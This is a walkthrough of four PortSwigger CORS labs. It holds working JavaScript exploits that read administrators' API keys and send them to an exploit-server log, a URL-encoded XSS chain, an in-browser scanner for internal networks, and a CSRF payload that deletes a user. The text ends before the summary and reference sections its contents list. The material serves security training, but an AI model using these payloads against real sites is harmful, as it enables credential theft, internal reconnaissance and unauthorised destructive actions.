# Cross-Origin Resource Sharing (CORS) - Complete PortSwigger Labs Guide

## Table of Contents
- [CORS Fundamentals](#cors-fundamentals)
- [Lab 1: CORS Vulnerability with Basic Origin Reflection](#lab-1-cors-vulnerability-with-basic-origin-reflection)
- [Lab 2: CORS Vulnerability with Trusted Null Origin](#lab-2-cors-vulnerability-with-trusted-null-origin)
- [Lab 3: CORS Vulnerability with Trusted Insecure Protocols](#lab-3-cors-vulnerability-with-trusted-insecure-protocols)
- [Lab 4: CORS Vulnerability with Internal Network Pivot Attack](#lab-4-cors-vulnerability-with-internal-network-pivot-attack)
- [Attack Techniques Summary](#attack-techniques-summary)
- [Burp Suite Workflow](#burp-suite-workflow)
- [References and Resources](#references-and-resources)

---

## CORS Fundamentals

### What is CORS?

Cross-Origin Resource Sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP) but introduces security risks through misconfiguration.

### Same-Origin Policy (SOP)

The same-origin policy restricts scripts from one origin from accessing data from another origin. An origin consists of:
- **Protocol** (http/https)
- **Domain** (example.com)
- **Port** (80, 443, etc.)

Two URLs have the same origin only if all three components match.

### How CORS Works

#### Simple Requests

For simple requests (GET, POST with specific content types), the browser sends:

```http
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
```

The server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
```

#### Preflight Requests

For complex requests (PUT, DELETE, custom headers), the browser first sends an OPTIONS request:

```http
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: X-Custom-Header
```

Server response:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### Key CORS Headers

| Header | Description |
|--------|-------------|
| `Access-Control-Allow-Origin` | Specifies allowed origins (* for all, or specific origin) |
| `Access-Control-Allow-Credentials` | Allows cookies and authentication (true/false) |
| `Access-Control-Allow-Methods` | Specifies allowed HTTP methods |
| `Access-Control-Allow-Headers` | Specifies allowed request headers |
| `Access-Control-Expose-Headers` | Headers accessible to JavaScript |
| `Access-Control-Max-Age` | How long preflight results can be cached |

### Common Vulnerabilities

1. **Reflected Origin Headers** - Server reflects arbitrary origins without validation
2. **Whitelist Parsing Errors** - Regex flaws allow bypass with malicious domains
3. **Null Origin Whitelisting** - Trusting `null` origin from sandboxed contexts
4. **XSS on Trusted Domains** - Exploiting trusted but vulnerable subdomains
5. **HTTPS Downgrade** - Trusting HTTP subdomains from HTTPS applications
6. **Internal Network CORS** - Wildcard CORS on internal resources

---

## Lab 1: CORS Vulnerability with Basic Origin Reflection

### Difficulty: Apprentice

### Lab Objective

Exploit an insecure CORS configuration that trusts all origins. Craft JavaScript to retrieve the administrator's API key and submit it to complete the lab.

**Credentials**: `wiener:peter`

### Vulnerability Explanation

The application has a critical CORS misconfiguration where:
- The server reflects **any** client-supplied `Origin` header in the `Access-Control-Allow-Origin` response
- No validation is performed on the origin
- `Access-Control-Allow-Credentials: true` is set, allowing credential-included requests
- Any attacker-controlled domain can make authenticated cross-origin requests

### Solution Walkthrough

#### Step 1: Initial Reconnaissance

1. Log in using credentials `wiener:peter`
2. Navigate to "My Account" page
3. Open browser developer tools (F12) → Network tab
4. Refresh the page and observe the AJAX request to `/accountDetails`

**Request:**
```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Cookie: session=your-session-cookie
```

**Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "username": "wiener",
  "email": "wiener@example.com",
  "apikey": "abc123xyz789",
  "sessions": ["current-session-token"]
}
```

#### Step 2: Test CORS Misconfiguration

1. Send the request to Burp Repeater (Right-click → "Send to Repeater")
2. Add the `Origin` header with an arbitrary domain:

```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Origin: https://attacker.com
Cookie: session=your-session-cookie
```

3. Observe the response reflects the origin:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "username": "wiener",
  "email": "wiener@example.com",
  "apikey": "abc123xyz789"
}
```

**Critical Finding**: The application reflects ANY origin, proving the vulnerability.

#### Step 3: Craft Exploit Payload

Create a JavaScript payload that:
1. Makes a cross-origin request to `/accountDetails`
2. Includes credentials (cookies) using `withCredentials: true`
3. Exfiltrates the API key to attacker's server

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '/log?key=' + this.responseText;
};
</script>
```

**Payload Breakdown:**
- `XMLHttpRequest` - Creates cross-origin request object
- `req.open('get', ...)` - Configures GET request to victim domain
- `req.withCredentials = true` - **Critical**: Includes session cookies
- `req.onload = reqListener` - Executes when response received
- `location = '/log?key=...'` - Redirects to log with stolen data

#### Step 4: Deploy Exploit

1. Go to exploit server
2. Update the **Body** section with the payload above
3. Replace `YOUR-LAB-ID` with actual lab ID
4. Click "Store" to save

#### Step 5: Test and Deliver

1. Click "View exploit" to test in your browser
2. Check access log - you should see your own API key
3. Click "Deliver exploit to victim"
4. Return to access log and retrieve the administrator's API key

#### Step 6: Submit Solution

1. Click "Submit solution"
2. Paste the administrator's API key
3. Lab solved! ✓

### HTTP Traffic Analysis

**Initial Request from Attacker's Page:**
```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Origin: https://exploit-server-id.exploit-server.net
Referer: https://exploit-server-id.exploit-server.net/
Cookie: session=administrator-session-cookie
```

**Vulnerable Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://exploit-server-id.exploit-server.net
Access-Control-Allow-Credentials: true
Vary: Origin
Content-Type: application/json

{
  "username": "administrator",
  "email": "admin@example.com",
  "apikey": "STOLEN-ADMIN-API-KEY-HERE",
  "sessions": ["admin-session-token"]
}
```

### Key Takeaways

- **`withCredentials: true`** is essential - without it, cookies aren't sent
- The `Origin` header is **browser-controlled** and cannot be spoofed from client-side JavaScript
- The server's reflection of arbitrary origins bypasses the same-origin policy
- This vulnerability enables complete account takeover if API keys provide privileged access

### Common Mistakes

1. **Forgetting `withCredentials`** - Request succeeds but returns unauthenticated data
2. **Incorrect lab ID** - Ensure you replace placeholder with actual lab domain
3. **Testing from wrong origin** - The exploit must come from your exploit server
4. **Not checking access logs** - Verify exploit worked before submitting

---

## Lab 2: CORS Vulnerability with Trusted Null Origin

### Difficulty: Apprentice

### Lab Objective

Exploit an insecure CORS configuration that trusts the `null` origin. Craft JavaScript using a sandboxed iframe to retrieve the administrator's API key.

**Credentials**: `wiener:peter`

### Vulnerability Explanation

The application has a CORS misconfiguration where:
- The server trusts the **`null`** origin value
- Browsers assign `null` origin to:
  - Sandboxed iframes (`<iframe sandbox="allow-scripts">`)
  - Requests from `file://` protocol
  - Cross-origin redirected requests
  - Documents with null origin
- Developers often whitelist `null` for local development purposes

### Technical Background: Null Origin

The `null` origin is generated in several contexts:

1. **Sandboxed iframes**:
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="...">
```

2. **File protocol**:
```
file:///C:/Users/attacker/exploit.html
```

3. **Data URLs**:
```html
<iframe src="data:text/html,<script>...</script>">
```

When JavaScript executes in these contexts, the browser sends `Origin: null` in cross-origin requests.

### Solution Walkthrough

#### Step 1: Verify Null Origin Trust

1. Log in as `wiener:peter`
2. Navigate to "My Account" and observe the `/accountDetails` request
3. Send request to Burp Repeater
4. Add `Origin: null` header:

```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Origin: null
Cookie: session=your-session-cookie
```

5. Observe the response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "username": "wiener",
  "apikey": "your-api-key"
}
```

**Confirmation**: Server reflects `null` origin, vulnerability confirmed!

#### Step 2: Understand Sandbox Attributes

The exploit uses an iframe with specific sandbox attributes:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="...">
```

**Sandbox Attributes:**
- `allow-scripts` - Permits JavaScript execution (required for our XHR)
- `allow-top-navigation` - Allows redirecting parent window (for exfiltration)
- `allow-forms` - Permits form submission (optional)
- **NOT** `allow-same-origin` - This is key! Omitting this forces `null` origin

#### Step 3: Craft Null Origin Exploit

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

**Payload Analysis:**
- `sandbox="..."` - Creates null origin context
- `srcdoc="..."` - Embeds inline HTML/JavaScript in iframe
- `XMLHttpRequest` - Makes cross-origin request from null origin
- `withCredentials: true` - Includes victim's session cookies
- `encodeURIComponent()` - URL-encodes API key data for log
- `location = '...'` - Exfiltrates data to attacker's server

#### Step 4: Deploy and Test

1. Go to exploit server
2. Paste the payload in Body section
3. Replace `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID`
4. Click "Store"
5. Click "View exploit" - check access log for your API key
6. Click "Deliver exploit to victim"

#### Step 5: Retrieve and Submit

1. Check access log
2. Find entry with administrator's API key
3. URL-decode if necessary
4. Submit solution with admin API key

### HTTP Traffic Analysis

**Request from Sandboxed Iframe:**
```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Origin: null
Referer: https://exploit-server-id.exploit-server.net/
Cookie: session=administrator-session-cookie
Connection: keep-alive
```

**Vulnerable Server Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Vary: Origin
Content-Type: application/json

{
  "username": "administrator",
  "apikey": "ADMIN-API-KEY-HERE"
}
```

**Exfiltration Request:**
```http
GET /log?key=%7B%22username%22%3A%22administrator%22%2C%22apikey%22%3A%22SECRET%22%7D HTTP/1.1
Host: exploit-server-id.exploit-server.net
```

### Alternative Null Origin Techniques

#### Data URL Method:
```html
<iframe src="data:text/html,<script>
var req = new XMLHttpRequest();
req.open('get', 'https://target.com/api', true);
req.withCredentials = true;
req.onload = function() {
    parent.postMessage(this.responseText, '*');
};
req.send();
</script>"></iframe>
```

#### File Protocol (requires victim to open local file):
```html
<!-- file:///C:/exploit.html -->
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://target.com/api', true);
req.withCredentials = true;
req.send();
</script>
```

### Key Takeaways

- Null origin whitelisting is a **critical misconfiguration**
- Sandboxed iframes are the most reliable null origin generation method
- The `allow-same-origin` flag **must be omitted** to force null origin
- Always URL-encode exfiltrated data to preserve special characters

### Common Mistakes

1. **Including `allow-same-origin`** - This gives iframe the parent's origin, not null
2. **Forgetting `encodeURIComponent()`** - Special characters break URL
3. **Wrong iframe syntax** - Use `srcdoc` attribute for inline content
4. **Not testing first** - Always view exploit before delivering to victim

### Real-World Impact

This vulnerability has been found in:
- Internal development tools exposed to internet
- APIs with lazy CORS configuration
- Legacy applications migrated to modern browsers
- Third-party integrations with poor security reviews

---

## Lab 3: CORS Vulnerability with Trusted Insecure Protocols

### Difficulty: Practitioner

### Lab Objective

Exploit a CORS configuration that trusts all subdomains regardless of protocol. Chain an XSS vulnerability on an HTTP subdomain with CORS to steal the administrator's API key.

**Credentials**: `wiener:peter`

### Vulnerability Explanation

This lab demonstrates multiple security failures:

1. **Protocol-Agnostic CORS Trust**:
   - Main site runs on HTTPS
   - CORS policy trusts subdomains on **both HTTP and HTTPS**
   - No protocol validation in origin checking

2. **XSS on HTTP Subdomain**:
   - `stock.lab-id.web-security-academy.net` runs on HTTP
   - `productId` parameter is vulnerable to XSS
   - No input sanitization

3. **Attack Chain**:
   - Attacker injects XSS on HTTP subdomain
   - XSS payload makes CORS request to HTTPS main domain
   - Main domain trusts subdomain (protocol ignored)
   - Attacker steals authenticated data via MITM-able HTTP channel

### Prerequisites

Understanding of:
- Cross-site scripting (XSS)
- HTTP vs HTTPS security boundaries
- URL encoding requirements
- JavaScript payload construction

### Solution Walkthrough

#### Step 1: Identify CORS Configuration

1. Log in as `wiener:peter`
2. View "My Account" page
3. Intercept `/accountDetails` request in Burp Proxy
4. Send to Repeater
5. Add origin header with HTTP subdomain:

```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Origin: http://stock.lab-id.web-security-academy.net
Cookie: session=your-session-cookie
```

6. Observe response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://stock.lab-id.web-security-academy.net
Access-Control-Allow-Credentials: true
```

**Finding**: HTTPS site trusts HTTP subdomain - protocol downgrade vulnerability!

#### Step 2: Discover XSS Vulnerability

1. Navigate to any product page
2. Click "Check stock" button
3. Observe request to `http://stock.lab-id.web-security-academy.net/`

**Stock Check Request:**
```http
GET /?productId=1&storeId=1 HTTP/1.1
Host: stock.lab-id.web-security-academy.net
```

4. Test for XSS by modifying `productId`:

```
http://stock.lab-id.web-security-academy.net/?productId=1<script>alert(1)</script>&storeId=1
```

5. If alert fires, XSS confirmed!

**Vulnerability**: The `productId` parameter is reflected without sanitization.

#### Step 3: Construct CORS Exploitation Payload

Create JavaScript that will execute on the HTTP subdomain:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;
};
```

**Payload Components:**
- Makes request to HTTPS main domain from HTTP subdomain
- Uses victim's credentials (`withCredentials: true`)
- Exfiltrates API key to attacker's server

#### Step 4: Encode Payload for XSS Injection

The payload must be:
1. Wrapped in `<script>` tags
2. URL-encoded for injection into `productId` parameter
3. Properly closed to maintain valid HTML

**Complete XSS Vector:**
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
function reqListener() {
    location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;
};
</script>
```

**URL-Encoded Version:**
```
<script>var%20req%20=%20new%20XMLHttpRequest();req.onload%20=%20reqListener;req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);req.withCredentials%20=%20true;req.send();function%20reqListener()%20{location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>
```

#### Step 5: Build Complete Exploit

Construct the full exploit URL with XSS payload:

```html
<script>
document.location = "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

**Exploit Breakdown:**
1. `document.location = "..."` - Redirects victim to malicious URL
2. `http://stock.lab-id...` - HTTP subdomain (XSS entry point)
3. `productId=4<script>...` - XSS injection point
4. `%3c/script>` - URL-encoded closing tag (`</script>`)
5. `&storeId=1` - Maintains valid URL structure

#### Step 6: Deploy Exploit

1. Go to exploit server
2. Replace Body with complete exploit
3. Replace ALL placeholders:
   - `YOUR-LAB-ID` (appears 3 times!)
   - `YOUR-EXPLOIT-SERVER-ID`
4. Click "Store"

**Final Exploit Example:**
```html
<script>
document.location = "http://stock.0a3f004e03e8b54c80d7c72e001a003a.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3f004e03e8b54c80d7c72e001a003a.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0ac8009f03dfb5c7806fc655016d0076.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

#### Step 7: Test and Deliver

1. Click "View exploit" - you should be redirected and see your own API key in logs
2. Check access log for confirmation
3. Click "Deliver exploit to victim"
4. Wait a few seconds
5. Check access log again for administrator's API key

#### Step 8: Submit Solution

1. Copy administrator's API key from access log
2. Click "Submit solution"
3. Paste API key
4. Lab solved! ✓

### Attack Flow Diagram

```
1. Victim visits attacker's exploit server
   ↓
2. JavaScript redirects to: http://stock.lab-id.web-security-academy.net/
   ↓
3. XSS payload executes in HTTP subdomain context
   ↓
4. Payload makes XMLHttpRequest to HTTPS main domain
   ↓
5. CORS policy accepts HTTP subdomain origin
   ↓
6. Response includes administrator's API key
   ↓
7. JavaScript exfiltrates data to attacker's server
```

### HTTP Traffic Analysis

**Step 1 - Initial Redirect:**
```http
GET / HTTP/1.1
Host: exploit-server-id.exploit-server.net

Response: 200 OK
<script>document.location = "http://stock.lab-id..."</script>
```

**Step 2 - XSS Triggered on HTTP Subdomain:**
```http
GET /?productId=4<script>...CORS-payload...</script>&storeId=1 HTTP/1.1
Host: stock.lab-id.web-security-academy.net

Response: 200 OK
<html>
<body>
...
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://lab-id.web-security-academy.net/accountDetails', true);
...
</script>
```

**Step 3 - CORS Request from HTTP to HTTPS:**
```http
GET /accountDetails HTTP/1.1
Host: lab-id.web-security-academy.net
Origin: http://stock.lab-id.web-security-academy.net
Cookie: session=administrator-session
Connection: keep-alive
```

**Step 4 - Vulnerable CORS Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://stock.lab-id.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "username": "administrator",
  "apikey": "STOLEN-KEY"
}
```

**Step 5 - Data Exfiltration:**
```http
GET /log?key={"username":"administrator","apikey":"STOLEN-KEY"} HTTP/1.1
Host: exploit-server-id.exploit-server.net
```

### Why This Attack Works

1. **Protocol Ignorance**: CORS policy trusts subdomain regardless of HTTP vs HTTPS
2. **XSS Entry Point**: HTTP subdomain provides injection point
3. **Credential Inclusion**: `withCredentials: true` sends authentication cookies
4. **Origin Trust**: Main domain accepts request from subdomain
5. **Data Leakage**: Sensitive data exposed via misconfigured CORS

### Real-World Implications

**HTTPS Downgrade Risks:**
- Man-in-the-middle attacks can intercept HTTP traffic
- Even without active MITM, XSS on HTTP subdomain enables attacks
- Mixed content policies don't prevent this attack vector

**Common Scenarios:**
- Legacy HTTP services on subdomains
- Development/staging servers on HTTP
- CDN endpoints with permissive CORS
- Microservices with inconsistent protocol enforcement

### Common Mistakes and Troubleshooting

1. **Payload Not Executing**:
   - Verify XSS vector works independently first
   - Check URL encoding is correct
   - Ensure `<script>` tags are properly opened/closed

2. **CORS Request Blocked**:
   - Confirm subdomain protocol (HTTP vs HTTPS)
   - Check Origin header is reflected
   - Verify `Access-Control-Allow-Credentials: true`

3. **No Data in Access Log**:
   - Test exploit with "View exploit" first
   - Verify all lab IDs are correctly replaced
   - Check browser console for JavaScript errors

4. **Encoding Issues**:
   - `</script>` must be encoded as `%3c/script>`
   - Space can be `%20` or `+`
   - Don't double-encode

### Prevention Strategies

1. **Protocol-Aware CORS Validation**:
```javascript
// Bad
if (origin.endsWith('.example.com')) {
    response.setHeader('Access-Control-Allow-Origin', origin);
}

// Good
if (origin.match(/^https:\/\/[\w-]+\.example\.com$/)) {
    response.setHeader('Access-Control-Allow-Origin', origin);
}
```

2. **Disable HTTP on Subdomains**:
- Enforce HTTPS-only with HSTS
- Redirect HTTP to HTTPS
- Block HTTP at load balancer/firewall

3. **Input Sanitization**:
- Validate and sanitize all user inputs
- Use Content Security Policy (CSP)
- Encode output context-appropriately

### Key Takeaways

- CORS policies must validate **both domain and protocol**
- XSS on any trusted origin can bypass CORS protections
- HTTP subdomains are particularly dangerous when trusted by HTTPS apps
- Always test CORS with protocol variations
- Defense-in-depth: Fix XSS AND CORS misconfigurations

---

## Lab 4: CORS Vulnerability with Internal Network Pivot Attack

### Difficulty: Expert

### Lab Objective

Exploit a CORS configuration that trusts all internal network origins. Scan the internal network (192.168.0.0/24, port 8080), discover an XSS vulnerability, and use it to delete user `carlos` via CORS-enabled admin panel.

**Credentials**: Not required (external attack)

### Vulnerability Explanation

This lab demonstrates a sophisticated multi-stage attack combining:

1. **Internal Network CORS Trust**:
   - Public website trusts all `192.168.0.*` origins
   - Internal services assumed secure due to network isolation
   - `Access-Control-Allow-Origin` set to internal IPs

2. **Network Scanning via Victim's Browser**:
   - Attacker uses victim's browser as a proxy
   - Scans internal network from inside firewall
   - Identifies live hosts on internal subnet

3. **XSS on Internal Service**:
   - Internal login page has XSS in `username` parameter
   - Lower security standards for internal tools
   - No authentication required to trigger XSS

4. **CSRF on Admin Panel**:
   - Admin delete function accessible from internal network
   - CSRF token can be extracted via CORS
   - Complete attack chain: Scan → XSS → CORS → CSRF

### Attack Prerequisites

- Understanding of:
  - JavaScript network scanning techniques
  - XSS exploitation
  - CORS mechanics
  - CSRF token extraction
  - Asynchronous JavaScript execution
  - HTML form manipulation

### Solution Walkthrough

#### Step 1: Network Reconnaissance

Create a payload to scan internal network for live hosts:

```html
<script>
// Stage 1: Network Scanner
for (var i = 1; i <= 254; i++) {
    var req = new XMLHttpRequest();
    req.open('get', 'http://192.168.0.' + i + ':8080/', true);
    req.onload = scanCallback(i);
    req.onerror = function() {}; // Suppress errors for unreachable hosts
    req.send();
}

function scanCallback(ip) {
    return function() {
        // Redirect to exploit server with discovered IP
        location.href = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/scan?ip=192.168.0.' + ip;
    };
}
</script>
```

**Scanner Logic:**
- Loops through `192.168.0.1` to `192.168.0.254`
- Sends GET requests to each IP on port 8080
- `onload` fires only for reachable hosts (200 OK or any response)
- `onerror` fires for unreachable hosts (ignored)
- First successful response redirects to exploit server with IP

**Deploy and Test:**
1. Paste into exploit server Body
2. Click "Store" then "Deliver exploit to victim"
3. Check access log for discovered IP (e.g., `192.168.0.141`)

#### Step 2: Content Enumeration

Once you have the internal IP, enumerate the login page:

```html
<script>
// Stage 2: Content Discovery
var req = new XMLHttpRequest();
req.open('get', 'http://192.168.0.141:8080/login', true);
req.onload = function() {
    // Exfiltrate page content (URL encoded in access logs)
    location.href = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/html?content=' + encodeURIComponent(req.responseText);
};
req.send();
</script>
```

**Purpose:**
- Retrieves HTML of internal login page
- URL-encodes content for log viewing
- Analyze HTML structure for XSS injection points

**Check Access Log:**
1. Decode URL-encoded content
2. Look for form fields and parameters
3. Identify potential XSS vectors (username, password, etc.)

#### Step 3: XSS Discovery and CORS Exploitation

Inject JavaScript via XSS to make CORS request to admin panel:

```html
<script>
// Stage 3: XSS + CORS Attack
var secondCors = encodeURIComponent(`
    var req = new XMLHttpRequest();
    req.open('get', '/admin', true);
    req.onload = function() {
        // Exfiltrate admin panel HTML
        location.href = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/admin?content=' + encodeURIComponent(req.responseText);
    };
    req.withCredentials = true;
    req.send();
`);

// Inject via XSS in username parameter
var exploitUrl = 'http://192.168.0.141:8080/login?username="/><script>' + secondCors + '</scr' + 'ipt><x y="';
location.href = exploitUrl;
</script>
```

**Payload Breakdown:**

1. **Double Encoding**:
   - Inner payload (CORS request) is encoded once
   - Entire XSS payload is part of URL

2. **XSS Injection Vector**:
```html
username="/><script>PAYLOAD</script><x y="
```
   - Closes attribute with `"/>`
   - Injects `<script>` tag
   - Uses `<x y="` to consume remaining HTML

3. **CORS Request**:
   - Executes in context of `http://192.168.0.141:8080`
   - Requests `/admin` panel (relative URL)
   - Uses `withCredentials: true` for authenticated request

4. **Script Tag Splitting**:
```javascript
'</scr' + 'ipt>'
```
   - Prevents premature closing of outer script tag
   - String concatenation executed at runtime

**Deploy and Check:**
1. Store and deliver exploit
2. Check access log for admin panel HTML
3. Decode and analyze for delete user form

#### Step 4: Extract CSRF Token and Delete User

Final payload to extract CSRF token and delete user `carlos`:

```html
<script>
// Stage 4: CSRF with Token Extraction
var deletePayload = encodeURIComponent(`
    var formData = new FormData();
    formData.append('csrf', 'EXTRACTED-CSRF-TOKEN-HERE');
    formData.append('username', 'carlos');

    var req = new XMLHttpRequest();
    req.open('post', '/admin/delete', true);
    req.withCredentials = true;
    req.send(formData);
`);

var exploitUrl = 'http://192.168.0.141:8080/login?username="/><script>' + deletePayload + '</scr' + 'ipt><x y="';
location.href = exploitUrl;
</script>
```

**Alternative: Dynamic Token Extraction**

For a fully automated attack, extract CSRF token dynamically:

```html
<script>
var fullExploit = encodeURIComponent(`
    // First, fetch admin panel
    var req1 = new XMLHttpRequest();
    req1.open('get', '/admin', true);
    req1.onload = function() {
        // Extract CSRF token from HTML
        var html = req1.responseText;
        var csrfToken = html.match(/name="csrf" value="([^"]+)"/)[1];

        // Now submit delete request with token
        var formData = new FormData();
        formData.append('csrf', csrfToken);
        formData.append('username', 'carlos');

        var req2 = new XMLHttpRequest();
        req2.open('post', '/admin/delete', true);
        req2.withCredentials = true;
        req2.send(formData);
    };
    req1.send();
`);

var exploitUrl = 'http://192.168.0.141:8080/login?username="/><script>' + fullExploit + '</scr' + 'ipt><x y="';
location.href = exploitUrl;
</script>
```

**Token Extraction Logic:**
```javascript
var csrfToken = html.match(/name="csrf" value="([^"]+)"/)[1];
```
- Regex searches for: `name="csrf" value="TOKEN"`
- `[^"]+` captures token value
- `[1]` returns first capture group

**Deploy Final Exploit:**
1. If using static token, extract from admin panel HTML (Step 3)
2. If using dynamic extraction, deploy automated payload
3. Store and deliver exploit
4. Verify user `carlos` is deleted
5. Lab solved! ✓

### Complete Single-Stage Exploit

For convenience, here's a fully automated exploit combining all stages:

```html
<script>
// Complete automated exploit
function scanNetwork() {
    for (var i = 1; i <= 254; i++) {
        var req = new XMLHttpRequest();
        req.open('get', 'http://192.168.0.' + i + ':8080/', false); // Synchronous for simplicity
        try {
            req.send();
            if (req.status === 200) {
                // Found live host, proceed to exploitation
                exploitHost('192.168.0.' + i);
                return;
            }
        } catch(e) {
            // Host unreachable, continue scanning
        }
    }
}

function exploitHost(ip) {
    var exploit = encodeURIComponent(`
        var req = new XMLHttpRequest();
        req.open('get', '/admin', true);
        req.onload = function() {
            var html = req.responseText;
            var csrfMatch = html.match(/name="csrf" value="([^"]+)"/);
            if (csrfMatch) {
                var formData = new FormData();
                formData.append('csrf', csrfMatch[1]);
                formData.append('username', 'carlos');

                var delReq = new XMLHttpRequest();
                delReq.open('post', '/admin/delete', true);
                delReq.withCredentials = true;
                delReq.send(formData);
            }
        };
        req.send();
    `);

    location.href = 'http://' + ip + ':8080/login?username="/><script>' + exploit + '</scr' + 'ipt><x y="';
}

// Start attack
scanNetwork();
</script>
```

**Note**: Synchronous XHR (`false` parameter) is deprecated but works for this attack scenario. For production exploits, use asynchronous with proper callback chaining.

### Attack Flow Diagram

```
┌─────────────────────────────────────────────────────┐
│ 1. Victim visits attacker's exploit server         │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ 2. JavaScript network scan: 192.168.0.1-254:8080   │
│    • Sends requests from victim's browser           │
│    • Identifies live host: 192.168.0.141            │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ 3. Enumerate /login page on discovered host         │
│    • Retrieve HTML structure                        │
│    • Identify XSS in username parameter             │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ 4. Inject XSS payload with CORS request             │
│    • XSS: username="/><script>CORS-CODE</script>    │
│    • CORS request to /admin from internal origin    │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ 5. Extract CSRF token from admin panel HTML         │
│    • Regex: /name="csrf" value="([^"]+)"/          │
│    • Token accessible due to CORS misconfiguration  │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ 6. Submit POST /admin/delete with CSRF token        │
│    • FormData: csrf=TOKEN&username=carlos           │
│    • Executed in internal network context           │
└─────────────────────┬───────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────┐
│ 7. User carlos deleted - Lab solved! ✓             │
└─────────────────────────────────────────────────────┘
```

### HTTP Traffic Analysis

**Stage 1: Network Scan (from victim's browser)**
```http
GET / HTTP/1.1
Host: 192.168.0.141:8080
Origin: https://exploit-server-id.exploit-server.net
```

**Stage 2: Login Page Enumeration**
```http
GET /login HTTP/1.1
Host: 192.168.0.141:8080

Response:
<form method="POST">
    <input name="username">
    <input name="password">
</form>
```

**Stage 3: XSS Injection**
```http
GET /login?username="/><script>ENCODED-PAYLOAD</script><x y=" HTTP/1.1
Host: 192.168.0.141:8080

Response renders as:
<input name="username" value=""/><script>CORS-CODE</script><x y="">
```

**Stage 4: CORS Request to Admin Panel**
```http
GET /admin HTTP/1.1
Host: 192.168.0.141:8080
Origin: http://192.168.0.141:8080

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://192.168.0.141:8080
Access-Control-Allow-Credentials: true

<form action="/admin/delete" method="POST">
    <input name="csrf" value="ABC123XYZ">
    <input name="username">
</form>
```

**Stage 5: Delete User (CSRF)**
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.141:8080
Origin: http://192.168.0.141:8080
Content-Type: multipart/form-data

csrf=ABC123XYZ&username=carlos

